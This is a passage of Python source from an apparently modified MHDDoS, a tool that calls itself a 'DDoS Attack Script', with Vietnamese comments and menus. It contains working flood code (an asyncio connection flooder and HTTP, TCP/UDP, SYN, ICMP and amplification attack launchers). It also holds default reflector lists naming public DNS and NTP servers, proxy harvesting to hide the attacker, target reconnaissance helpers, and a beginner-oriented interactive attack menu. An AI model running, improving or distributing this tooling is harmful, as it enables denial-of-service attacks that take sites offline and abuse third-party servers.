            await asyncio.sleep(self.POLL)

        while self._synevent.is_set():
            proxy = randchoice(self._proxies) if self._proxies else None
            w = None
            try:
                r, w = await asyncio.wait_for(
                    _async_open_connection(self._host, self._port, self._ssl,
                                           self._target.raw_host, proxy),
                    timeout=10)
                CONNECTIONS_SENT += 1
                payload = self._payload_abs if (proxy is not None and not self._ssl) \
                    else self._payload
                for _ in range(self._rpc):
                    if not self._synevent.is_set():
                        break
                    w.write(payload)
                    await w.drain()
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
            except asyncio.CancelledError:
                raise
            except Exception:
                await asyncio.sleep(self.POLL)       # tránh busy-spin khi lỗi
            finally:
                if w is not None:
                    with suppress(Exception):
                        w.close()
                    with suppress(Exception, asyncio.CancelledError):
                        await asyncio.wait_for(w.wait_closed(), timeout=2)

    async def _runner(self) -> None:
        tasks = [asyncio.create_task(self.flooder()) for _ in range(self._workers)]
        try:
            while self._synevent.is_set():
                await asyncio.sleep(0.5)
        finally:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

    def run(self) -> None:
        if self._synevent is None:
            self._synevent = Event()
            self._synevent.set()
        try:
            asyncio.run(self._runner())
        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:                            # pragma: no cover
            logger.debug(f"[ASYNCIO] stopped: {e.__repr__()}")


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        # [B20] provider["type"] trong config.json là CHUỖI ("SOCKS5"/"HTTP"...)
        # -> so sánh trực tiếp với int luôn sai, phải quy đổi qua stringToProxyType.
        want = {1: ProxyType.HTTP, 4: ProxyType.SOCKS4,
                5: ProxyType.SOCKS5}.get(Proxy_type)

        selected = []
        for provider in cf["proxy-providers"]:
            ptype = ProxyType.stringToProxyType(str(provider.get("type", "http")))
            if ptype == ProxyType.HTTPS:      # proxy "https" thực chất là HTTP
                ptype = ProxyType.HTTP
            if want is None or ptype == want:
                selected.append((provider, ptype))

        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
            % len(selected))
        proxes: Set[Proxy] = set()

        if not selected:
            return proxes

        with ThreadPoolExecutor(max(1, len(selected))) as executor:
            futures = [executor.submit(ProxyManager.download, provider, ptype)
                        for provider, ptype in selected]
            for future in as_completed(futures):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    CF_RANGES: Tuple[Tuple[str, int], ...] = (
        ("173.245.48.0", 20), ("103.21.244.0", 22), ("103.22.200.0", 22),
        ("103.31.4.0", 22), ("141.101.64.0", 18), ("108.162.192.0", 18),
        ("190.93.240.0", 20), ("188.114.96.0", 20), ("197.234.240.0", 22),
        ("198.41.128.0", 17), ("162.158.0.0", 15), ("104.16.0.0", 13),
        ("104.24.0.0", 14), ("172.64.0.0", 13), ("131.0.72.0", 22),
    )

    @staticmethod
    def checkRawSocket() -> bool:
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def _prompt_target(cons: str, label: str = "give-me-ipaddress#"):
        try:
            raw = input(f'{cons}{label} ').strip()
        except EOFError:
            return None, "exit"
        if not raw:
            return None, "empty"
        up = raw.upper()
        if up == "BACK":
            return None, "back"
        if up == "CLEAR":
            return None, "clear"
        if {up} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
            return None, "exit"
        return raw, "ok"

    @staticmethod
    def _clean_domain(domain: str) -> str:
        d = domain.replace('https://', '').replace('http://', '')
        if "/" in d:
            d = d.split("/")[0]
        if ":" in d:
            d = d.split(":")[0]
        return d.strip()

    @staticmethod
    def _ip2int(ip: str):
        parts = ip.split(".")
        if len(parts) != 4:
            return None
        n = 0
        for p in parts:
            if not p.isdigit():
                return None
            v = int(p)
            if v > 255:
                return None
            n = (n << 8) | v
        return n

    @classmethod
    def _is_cloudflare(cls, ip: str) -> bool:
        n = cls._ip2int(ip)
        if n is None:
            return False
        for base, bits in cls.CF_RANGES:
            b = cls._ip2int(base)
            if b is None:
                continue
            mask = (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF
            if (n & mask) == (b & mask):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            try:
                cmd = input(cons + " ").strip()
            except EOFError:
                exit()
            if not cmd:
                continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(sorted(ToolsConsole.METHODS)))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit()

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
                continue

            if cmd == "CFIP":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons)
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    domain = ToolsConsole._clean_domain(domain)
                    print('please wait ...', end="\r")
                    try:
                        ips = [str(a) for a in resolver.resolve(domain, "A")]
                    except Exception as e:
                        logger.error(f"DNS error: {e.__str__() or e.__repr__()}")
                        continue

                    if not ips:
                        logger.info("Không tìm thấy bản ghi A nào.")
                        continue

                    for ip in ips:
                        logger.info(
                            f"{ip:<16} -> "
                            + (f"{bcolors.OKGREEN}CLOUDFLARE{bcolors.RESET}"
                               if ToolsConsole._is_cloudflare(ip)
                               else "không phải Cloudflare"))
                    logger.info(f"Đã kiểm tra {len(ips)} IP của {domain}")
                continue

            if cmd == "DNS":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons)
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    domain = ToolsConsole._clean_domain(domain)
                    print('please wait ...', end="\r")
                    for rtype in ("A", "AAAA", "CNAME", "MX", "NS", "TXT"):
                        try:
                            vals = [str(r) for r in resolver.resolve(domain, rtype)]
                        except Exception:
                            vals = []
                        logger.info(f"{rtype:<6}: {', '.join(vals) if vals else '-'}")
                continue

            if cmd == "CHECK":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons)
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    url = domain if domain.lower().startswith("http") else "http://" + domain
                    logger.info("please wait ...")
                    with suppress(Exception):
                        with get(url, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                         if r.status_code <= 500 else "OFFLINE"))
                continue

            if cmd == "INFO":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons)
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    domain = ToolsConsole._clean_domain(domain)
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))
                continue

            if cmd == "TSSRV":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons, "give-me-domain#")
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    domain = ToolsConsole._clean_domain(domain)
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
                continue

            if cmd == "PING":
                while True:
                    domain, act = ToolsConsole._prompt_target(cons)
                    if act == "empty":
                        continue
                    if act == "back":
                        break
                    if act == "clear":
                        print("\033c")
                        continue
                    if act == "exit":
                        exit()

                    domain = ToolsConsole._clean_domain(domain)

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))
                continue

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        me = getpid()
        for proc in process_iter():
            with suppress(Exception):
                name = (proc.name() or "").lower()
                if name.startswith("python") and proc.pid != me:
                    proc.kill()

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L7 async: python3 %s ASYNCIO <url> 0 <workers> none.txt <rpc> <duration>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(sorted(Methods.LAYER4_METHODS)), len(Methods.LAYER4_METHODS),
               ", ".join(sorted(Methods.LAYER7_METHODS)), len(Methods.LAYER7_METHODS),
               ", ".join(sorted(ToolsConsole.METHODS)), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0], argv[0]))

    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(srv.port)
            except Exception:
                Info[rec] = 'Not found'
        return Info

    @staticmethod
    def info(domain):
        for url in (f"https://ipwho.is/{domain}",
                    f"https://ipwhois.app/json/{domain}/"):
            with suppress(Exception):
                with get(url, timeout=20) as r:
                    if r.status_code != 200:
                        continue
                    j = r.json()
                    if not j.get("success", True):
                        continue
                    conn = j.get("connection") or {}
                    return {
                        "success": True,
                        "country": j.get("country") or "-",
                        "city": j.get("city") or "-",
                        "region": j.get("region") or "-",
                        "org": j.get("org") or conn.get("org") or "-",
                        "isp": j.get("isp") or conn.get("isp") or "-",
                    }
        return {"success": False}

def _proxy_type_from_int(proxy_ty: int) -> ProxyType:
    """1 = HTTP, 4 = SOCKS4, 5 = SOCKS5."""
    return {1: ProxyType.HTTP, 4: ProxyType.SOCKS4, 5: ProxyType.SOCKS5}.get(
        proxy_ty, ProxyType.HTTP)


def _read_proxies(path: Path, ptype: ProxyType) -> Set[Proxy]:
    """PyRoxy mới nhận ptype; bản cũ thì không -> fallback."""
    try:
        return ProxyUtiles.readFromFile(path, ptype)
    except TypeError:
        return ProxyUtiles.readFromFile(path)

def handleProxyList(con, proxy_li, proxy_ty, url=None, check_threads: int = 100):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=max(1, min(check_threads, 500)),
                url=url.human_repr() if url
                else con.get("PROXY_CHECK_URL",
                                "https://www.google.com/generate_204"),
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = _read_proxies(proxy_li, _proxy_type_from_int(proxy_ty))
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
        proxies = None

    return proxies


# =====================================================================
#  INTERACTIVE MENU  +  HÀM PHỤ TRỢ
# =====================================================================

DEFAULT_REFLECTORS = {
    "NTP":   ["216.239.35.0", "216.239.35.4", "129.6.15.28", "132.163.97.1"],
    "DNS":   ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"],
    "MEM":   ["1.1.1.1", "8.8.8.8", "8.8.4.4"],
    "CLDAP": ["1.1.1.1", "8.8.8.8"],
    "RDP":   ["1.1.1.1"],
    "CHAR":  ["1.1.1.1"],
    "ARD":   ["1.1.1.1"],
}

BANNER = r"""
 __  __ _   _ ___  ___  ___  ___
|  \/  | | | |   \|   \|   \/ _ \
| |\/| | |_| | |) | |) | |) | (_) |
|_|  |_|\___/|___/|___/|___/\___/   v{ver}
"""


def _reset_logging():
    root = getLogger()
    for h in list(root.handlers):
        root.removeHandler(h)
        with suppress(Exception):
            h.close()
    stream = sys.stderr
    if getattr(stream, "closed", False):
        try:
            stream = sys.stderr = open(2, "w", buffering=1,
                                       encoding="utf-8", errors="replace")
        except OSError:
            stream = sys.stdout
    basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
                datefmt="%H:%M:%S", stream=stream, force=True)
    logger.setLevel("INFO")


def _ask(prompt, default=None, cast=str, choices=None, upper=False, minimum=None):
    while True:
        suffix = f" {bcolors.OKGREEN}[{default}]{bcolors.RESET}" if default is not None else ""
        try:
            raw = input(f"{bcolors.BOLD}{prompt}{bcolors.RESET}{suffix}: ").strip()
        except EOFError:
            return default if default is not None else ""
        if not raw:
            if default is not None:
                raw = str(default)
            else:
                print(f"  {bcolors.FAIL}-> Không được để trống!{bcolors.RESET}")
                continue
        if upper:
            raw = raw.upper()
        if choices:
            norm = {str(c).upper() for c in choices}
            if raw.upper() not in norm:
                print(f"  {bcolors.FAIL}-> Chỉ chấp nhận: {', '.join(sorted(norm))}{bcolors.RESET}")
                continue
        try:
            val = cast(raw)
        except (ValueError, TypeError):
            print(f"  {bcolors.FAIL}-> Giá trị không hợp lệ, thử lại!{bcolors.RESET}")
            continue
        if minimum is not None and isinstance(val, int) and val < minimum:
            print(f"  {bcolors.FAIL}-> Phải >= {minimum}{bcolors.RESET}")
            continue
        return val


def _ensure_empty_proxy_file():
    p = __dir__ / "files" / "proxies" / "none.txt"
    p.parent.mkdir(parents=True, exist_ok=True)
    if not p.exists():
        p.write_text("")
    return "none.txt"


def _ensure_basic_files():
    base = __dir__ / "files"
    base.mkdir(parents=True, exist_ok=True)
    for name, data in (("useragent.txt", DEFAULT_USERAGENTS),
                       ("referers.txt", DEFAULT_REFERERS)):
        p = base / name
        if not p.exists() or not p.read_text(encoding="utf-8", errors="replace").strip():
            p.write_text("\n".join(data) + "\n", encoding="utf-8")
            print(f"  {bcolors.OKCYAN}-> Đã tạo files/{name}{bcolors.RESET}")


def _ensure_reflector_file(name, method):
    p = __dir__ / "files" / name
    p.parent.mkdir(parents=True, exist_ok=True)
    if not p.exists():
        p.write_text("\n".join(DEFAULT_REFLECTORS.get(method, [])) + "\n")
        print(f"  {bcolors.OKCYAN}-> Đã tạo file reflector mẫu: files/{name}{bcolors.RESET}")
    return name


def _print_methods():
    print(f"\n{bcolors.HEADER}--- Layer 7 ({len(Methods.LAYER7_METHODS)}) ---{bcolors.RESET}")
    print(", ".join(sorted(Methods.LAYER7_METHODS)))
    print(f"\n{bcolors.HEADER}--- Layer 4 ({len(Methods.LAYER4_METHODS)}) ---{bcolors.RESET}")
    print(", ".join(sorted(Methods.LAYER4_METHODS)))
    print(f"\n{bcolors.HEADER}--- Công cụ ---{bcolors.RESET}")
    print(", ".join(sorted(ToolsConsole.METHODS)))
    print()


def _menu_layer7():
    _ensure_basic_files()
    print(f"\n{bcolors.HEADER}=== Layer 7 - HTTP Flood ==={bcolors.RESET}")
    print("  " + ", ".join(sorted(Methods.LAYER7_METHODS)))
    print(f"  {bcolors.WARNING}(GET / POST là dễ nhất, phù hợp người mới){bcolors.RESET}\n")

    method = _ask("Method", default="GET", choices=Methods.LAYER7_METHODS, upper=True)
    if method == "BOMB" and not (
            bombardier_path.exists() or bombardier_path.with_suffix(".exe").exists()):
        print(f"  {bcolors.WARNING}Lưu ý: BOMB cần binary 'bombardier' trong "
              f"{bombardier_path.parent}{bcolors.RESET}")
    if method in Methods.ASYNC_METHODS:
        print(f"  {bcolors.OKCYAN}AIOHTTP/ASYNCIO chạy bằng asyncio: "
              f"'Số threads' = số worker coroutine (nên để 500-5000).{bcolors.RESET}")
        print(f"  {bcolors.OKCYAN}ASYNCIO mở kết nối mới mỗi vòng (CPS cao); "
              f"AIOHTTP giữ kết nối keep-alive.{bcolors.RESET}")

    url = _ask("URL mục tiêu (vd: https://example.com)")
    if not url.lower().startswith("http"):
        url = "http://" + url

    if _ask("Dùng proxy?", default="n", choices=["y", "n"]).lower() == "y":
        socks_type = _ask("Loại proxy (0=all, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=random)",
                          default="0", choices=["0", "1", "4", "5", "6"])
        proxylist = _ask("Tên file proxy (trong files/proxies/)", default="proxies.txt")
        print(f"  {bcolors.WARNING}Nếu file chưa có, tool sẽ tự tải & check proxy (hơi lâu).{bcolors.RESET}")
        if method in Methods.ASYNC_METHODS:
            print(f"  {bcolors.WARNING}Lưu ý: AIOHTTP/ASYNCIO chỉ dùng được proxy HTTP "
                  f"(socks type 1).{bcolors.RESET}")
    else:
        socks_type, proxylist = "0", _ensure_empty_proxy_file()

    threads = _ask("Số threads", default="500", cast=int, minimum=1)
    rpc = _ask("RPC (request mỗi kết nối)", default="1", cast=int, minimum=1)
    duration = _ask("Thời gian chạy (giây)", default="60", cast=int, minimum=1)
    debug = _ask("Bật debug?", default="n", choices=["y", "n"]).lower() == "y"

    args = [method, url, socks_type, str(threads), proxylist, str(rpc), str(duration)]
    if debug:
        args.append("debug")
    return args


def _menu_layer4():
    print(f"\n{bcolors.HEADER}=== Layer 4 - TCP/UDP Flood ==={bcolors.RESET}")
    print("  " + ", ".join(sorted(Methods.LAYER4_METHODS)))
    print(f"  {bcolors.WARNING}Nhóm amplification: {', '.join(sorted(Methods.LAYER4_AMP))}{bcolors.RESET}\n")

    method = _ask("Method", default="TCP", choices=Methods.LAYER4_METHODS, upper=True)
    if method in {"SYN", "ICMP", "OVH-UDP"}:
        print(f"  {bcolors.WARNING}Lưu ý: {method} cần quyền Admin/root (raw socket).{bcolors.RESET}")

    target = _ask("Target ip:port", default="1.1.1.1:80")
    if ":" not in target:
        target += ":80"

    threads = _ask("Số threads", default="600", cast=int, minimum=1)
    duration = _ask("Thời gian chạy (giây)", default="60", cast=int, minimum=1)
    args = [method, target, str(threads), str(duration)]

    if method in Methods.LAYER4_AMP:
        name = _ask("Tên file reflector (trong files/)", default=f"reflector_{method.lower()}.txt")
        _ensure_reflector_file(name, method)
        args.append(name)
        print(f"  {bcolors.WARNING}Lưu ý: amplification cần server cho phép spoof IP nguồn.{bcolors.RESET}")
    elif method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
        if _ask("Dùng proxy?", default="n", choices=["y", "n"]).lower() == "y":
            socks_type = _ask("Loại proxy (1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=random)",
                              default="5", choices=["1", "4", "5", "6"])
            proxylist = _ask("Tên file proxy (trong files/proxies/)", default="proxies.txt")
            args += [socks_type, proxylist]
    return args


def _run_args(args):
    global argv
    _reset_logging()
    saved = argv
    argv = [saved[0]] + list(args)
    try:
        main()
    finally:
        argv = saved


def interactive_menu():
    _ensure_basic_files()
    while True:
        print(bcolors.OKCYAN + BANNER.format(ver=__version__) + bcolors.RESET)
        print(f"  {bcolors.BOLD}MHDDoS - Menu tương tác{bcolors.RESET}\n")
        print("  [1] Layer 7  - HTTP Flood")
        print("  [2] Layer 4  - TCP / UDP Flood")
        print("  [3] Công cụ  - PING / INFO / DSTAT / TSSRV / CHECK / CFIP / DNS")
        print("  [4] Xem danh sách method")
        print("  [5] Hướng dẫn dùng command-line")
        print("  [6] Dừng tất cả tiến trình python (cẩn thận: kill cả script khác)")
        print("  [0] Thoát\n")

        choice = _ask("Chọn", default="0")

        if choice == "0":
            print(f"\n{bcolors.OKGREEN}Tạm biệt!{bcolors.RESET}")
            return
        if choice == "1":
            args = _menu_layer7()
        elif choice == "2":
            args = _menu_layer4()
        elif choice == "3":
            args = ["TOOLS"]
        elif choice == "4":
            _print_methods()
            continue
        elif choice == "5":
            ToolsConsole.usage()
            continue
        elif choice == "6":
            args = ["STOP"]
        else:
            print(f"  {bcolors.FAIL}Lựa chọn không hợp lệ!{bcolors.RESET}")
            continue

        print(f"\n{bcolors.OKCYAN}Lệnh tương đương:{bcolors.RESET} "
              f"python {Path(argv[0]).name} {' '.join(args)}")
        if _ask("Bắt đầu?", default="y", choices=["y", "n"]).lower() != "y":
            continue

        print(f"{bcolors.OKCYAN}Đang chạy... (Ctrl+C để dừng){bcolors.RESET}\n")
        try:
            _run_args(args)
        except SystemExit:
            pass
        except KeyboardInterrupt:
            pass
        print(f"\n{bcolors.OKGREEN}--- Xong, quay lại menu ---{bcolors.RESET}\n")


# =====================================================================
#  MAIN
# =====================================================================

def _int_arg(index: int, name: str, minimum: int = 1, maximum: int = None) -> int:
    if index >= len(argv):
        exit(f"Thiếu tham số: {name} (argv[{index}])")
    try:
        val = int(str(argv[index]).strip())
    except ValueError:
        exit(f"{name} không hợp lệ: '{argv[index]}' (phải là số nguyên)")
    if val < minimum:
        exit(f"{name} phải >= {minimum} (đang là {val})")
    if maximum is not None and val > maximum:
        exit(f"{name} phải <= {maximum} (đang là {val})")
    return val


def main():
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
                return
            if one == "STOP":
                ToolsConsole.stop()
                return

            method = one
            if method not in Methods.ALL_METHODS:
                exit("Method Not Found: %s\nCác method hợp lệ: %s"
                     % (method, ", ".join(sorted(Methods.ALL_METHODS))))

            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None

            urlraw = argv[2].strip() if len(argv) >= 3 else ""
            if not urlraw:
                exit("Thiếu mục tiêu (argv[2])")
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method in Methods.LAYER7_METHODS:
                try:
                    url = URL(urlraw)
                except Exception as e:
                    exit("URL không hợp lệ: ", urlraw, str(e))
                host = url.host

                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, str(e))

                threads = _int_arg(4, "threads", 1)
                rpc = _int_arg(6, "rpc", 1)
                timer = _int_arg(7, "duration", 1)
                proxy_ty = _int_arg(3, "socks_type", 0, 6)
                proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                proxies: Any = set()

                if method == "BOMB" and not (
                        bombardier_path.exists()
                        or bombardier_path.with_suffix('.exe').exists()):
                    exit("Install bombardier: "
                         "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method")

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist "
                         f"({useragent_li}) - chạy menu hoặc tạo file.")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist "
                         f"({referers_li}) - chạy menu hoặc tạo file.")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines() if a.strip())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines() if a.strip())

                if not uagents:
                    exit("Empty Useragent File ")
                if not referers:
                    exit("Empty Referer File ")

                if threads > 1000 and method not in Methods.ASYNC_METHODS:
                    logger.warning("Thread is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Request Pre Connection) is higher than 100")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url,
                                          check_threads=threads)

                if method == "BOMB" and not proxies:
                    exit("BOMB cần proxy (thêm proxy hoặc chọn method khác)")

                # [B18] async engine chỉ hỗ trợ proxy HTTP -> lọc bỏ SOCKS
                if method in Methods.ASYNC_METHODS and proxies:
                    http_proxies = {p for p in proxies
                                    if p.type not in (ProxyType.SOCKS4, ProxyType.SOCKS5)}
                    if not http_proxies:
                        logger.warning("Không có proxy HTTP nào -> chạy không proxy")
                        proxies = None
                    else:
                        if len(http_proxies) != len(proxies):
                            logger.warning(
                                f"Bỏ {len(proxies) - len(http_proxies)} proxy SOCKS "
                                f"(AIOHTTP/ASYNCIO chỉ hỗ trợ proxy HTTP)")
                        proxies = http_proxies

                if method == "AIOHTTP":
                    AsyncHttpFlood(url, workers=threads, rpc=rpc, synevent=event,
                                   useragents=uagents, referers=referers,
                                   proxies=proxies).start()
                elif method == "ASYNCIO":
                    AsyncCpsFlood(url, workers=threads, rpc=rpc, synevent=event,
                                  proxies=proxies).start()
                else:
                    for thread_id in range(threads):
                        HttpFlood(thread_id, url, host, method, rpc, event,
                                  uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                try:
                    target = URL(urlraw)
                except Exception as e:
                    exit("Target không hợp lệ: ", urlraw, str(e))

                port = target.port
                target = target.host
                target_host = target

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', target_host, str(e))

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP",
                              "ARD", "SYN", "ICMP", "OVH-UDP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket (cần quyền root/Administrator)")

                if method in Methods.LAYER4_AMP:
                    logger.warning("this method need spoofable servers please check")
                    logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

                threads = _int_arg(3, "threads", 1)
                timer = _int_arg(4, "duration", 1)
                proxies = None
                ref = None

                argfive = argv[5].strip() if len(argv) >= 6 else ""

                if method in Methods.LAYER4_AMP:
                    if not argfive:
                        exit(f"{method} cần file reflector:\n"
                             f"  python start.py {method} <ip:port> <threads> "
                             f"<duration> <reflector_file>")
                    refl_li = Path(__dir__ / "files" / argfive)
                    if not refl_li.exists():
                        exit(f"Reflector file không tồn tại: {refl_li}")
                    if len(argv) == 7:
                        logger.setLevel("DEBUG")
                    ref = set(Tools.IP.findall(refl_li.open("r").read()))
                    if not ref:
                        exit("Empty Reflector File ")

                elif argfive:
